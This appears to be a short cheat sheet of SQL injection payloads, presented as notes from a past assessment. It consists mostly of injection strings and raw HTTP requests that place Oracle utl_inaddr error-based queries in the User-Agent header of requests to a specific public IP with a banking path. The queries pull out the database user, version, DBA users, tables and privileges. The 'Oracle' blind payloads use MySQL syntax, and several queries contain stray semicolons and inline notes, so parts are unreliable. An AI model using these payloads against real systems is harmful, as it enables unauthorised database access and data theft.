###  Real world example of Oracle SQL Injection


# Basic Oracle Blind SQL Injection Payloads
```
1' and if(1=1, sleep(20), true)#
1' or if(1=1, sleep(20), true)#
1' and if(1=1, sleep(20), false)#
1' or if(1=1, sleep(20), true)#
1' and if(1=1, sleep(20), true) -- -
1' or if(1=1, sleep(20), true) -- -
1' and if(1=1, sleep(20), false) -- -
1' or if(1=1, sleep(20), true) -- -
```
# Real world example of Oracle SQL Injection 
This application security assessment was conducted by me 3 year ago.I released My Noted of Oracle Base SQL injection due to having been scarce to make reference to Oracle Base SQL Injectin while conducting Oracle Base SQL Injection.
```
POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select user from dual))--+) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```

```
POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select banner from v$version where rownum=1))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```
```

POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select username FROM user_role_privs WHERE granted_role='DBA';))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1

```
```

POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select owner, table_name FROM all_tables;))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```


```
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT global_name FROM global_name;) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT * FROM session_privs;(Retrieves Current Privs)) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT global_name FROM global_name;) )--
```
